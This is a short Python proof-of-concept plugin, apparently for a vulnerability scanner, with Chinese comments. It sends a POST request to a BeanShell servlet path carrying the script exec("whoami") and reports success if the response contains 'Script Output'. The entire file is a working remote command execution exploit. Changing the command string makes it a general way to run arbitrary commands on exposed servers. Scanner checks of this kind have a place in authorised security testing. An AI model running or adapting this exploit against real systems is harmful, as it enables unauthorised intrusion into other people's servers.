
# 导入需要的模块
from lib.request.requests_new import Requests

# 下面为主函数，不要修改函数名
def payload(target):
	
	uri = "/servlet/~ic/bsh.servlet.BshServlet" # 注意uri首字符必须带“/”
	url = target+uri
	headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
	'Content-Type': 'application/x-www-form-urlencoded'
	}

	data = 'bsh.script=exec("whoami");'

	response = Requests().post(url, headers=headers, data=data)

	# 判断是否执行成功，成功返回True，否则返回False
	if "Script Output" in response.text:
		return True
	else:
		return False